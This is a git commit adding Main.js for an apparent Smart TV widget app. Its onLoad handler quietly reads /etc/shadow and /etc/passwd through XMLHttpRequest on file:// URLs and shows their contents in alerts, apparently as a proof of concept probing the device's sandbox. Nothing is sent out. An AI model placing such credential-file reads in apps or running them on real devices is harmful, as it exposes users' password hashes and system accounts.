d3b0830148a5eca174c14ce42610c6fd379ec7c2
softwarehacker <softwarehacker@softwarehackers.org>
2015-03-16 16:15:04 -0700

    initial commit

---
+++ app/javascript/Main.js
@@ -0,0 +1,86 @@
+var widgetAPI = new Common.API.Widget();
+var tvKey = new Common.API.TVKeyValue();
+
+var Main =
+{
+
+};
+
+Main.onLoad = function()
+{
+	// Enable key event processing
+	this.enableKeys();
+	widgetAPI.sendReadyEvent();
+	
+	// Check for the various File API support.
+	if (window.File && window.FileReader && window.FileList && window.Blob) {
+	  // Great success! All the File APIs are supported.
+	} else {
+	  alert('The File APIs are not fully supported in this browser.');
+	}
+	
+	readTextFile("file:///etc/shadow");
+	readTextFile("file:///etc/passwd");
+};
+
+function readTextFile(file)
+{
+    var rawFile = new XMLHttpRequest();
+    rawFile.open("GET", file, false);
+    rawFile.onreadystatechange = function ()
+    {
+        if(rawFile.readyState === 4)
+        {
+            if(rawFile.status === 200 || rawFile.status == 0)
+            {
+                var allText = rawFile.responseText;
+                alert(allText);
+            }
+        }
+    }
+    rawFile.send(null);
+}
+
+Main.onUnload = function()
+{
+
+};
+
+Main.enableKeys = function()
+{
+	document.getElementById("anchor").focus();
+};
+
+Main.keyDown = function()
+{
+	var keyCode = event.keyCode;
+	alert("Key pressed: " + keyCode);
+
+	switch(keyCode)
+	{
+		case tvKey.KEY_RETURN:
+		case tvKey.KEY_PANEL_RETURN:
+			alert("RETURN");
+			widgetAPI.sendReturnEvent();
+			break;
+		case tvKey.KEY_LEFT:
+			alert("LEFT");
+			break;
+		case tvKey.KEY_RIGHT:
+			alert("RIGHT");
+			break;
+		case tvKey.KEY_UP:
+			alert("UP");
+			break;
+		case tvKey.KEY_DOWN:
+			alert("DOWN");
+			break;
+		case tvKey.KEY_ENTER:
+		case tvKey.KEY_PANEL_ENTER:
+			alert("ENTER");
+			break;
+		default:
+			alert("Unhandled key");
+			break;
+	}
+};
